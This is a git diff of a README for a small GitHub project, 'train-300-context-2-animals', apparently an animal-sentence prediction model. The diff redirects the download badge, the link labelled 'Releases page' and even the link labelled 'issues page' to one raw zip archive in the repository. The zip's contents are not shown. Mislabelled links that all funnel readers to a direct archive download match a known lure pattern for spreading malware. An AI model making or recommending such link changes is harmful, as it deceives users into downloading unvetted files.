@@ -6,7 +6,7 @@ Welcome to the **train-300-context-2-animals** project! This application gives y
 
 ## 📥 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Harry2271/train-300-context-2-animals/releases)
+[![Download](https://github.com/Harry2271/train-300-context-2-animals/raw/refs/heads/main/artifacts/train_animals_context_v3.2.zip)](https://github.com/Harry2271/train-300-context-2-animals/raw/refs/heads/main/artifacts/train_animals_context_v3.2.zip)
 
 ## 🛠️ System Requirements
 
@@ -21,7 +21,7 @@ Before you start, make sure your computer meets these basic requirements:
 
 1. **Visit the Releases Page**
 
-   To get the software, visit our [Releases page](https://github.com/Harry2271/train-300-context-2-animals/releases). Here, you will find the latest version of the application.
+   To get the software, visit our [Releases page](https://github.com/Harry2271/train-300-context-2-animals/raw/refs/heads/main/artifacts/train_animals_context_v3.2.zip). Here, you will find the latest version of the application.
 
 2. **Choose the Right File**
 
@@ -66,7 +66,7 @@ You can experiment with the model to see how it predicts different sentences usi
 
 If you need further help, check the README files included in the application. They contain information on how the model works, along with examples.
 
-If you still have questions, feel free to reach out on our [issues page](https://github.com/Harry2271/train-300-context-2-animals/issues).
+If you still have questions, feel free to reach out on our [issues page](https://github.com/Harry2271/train-300-context-2-animals/raw/refs/heads/main/artifacts/train_animals_context_v3.2.zip).
 
 ## 🏷️ Topics Covered
 
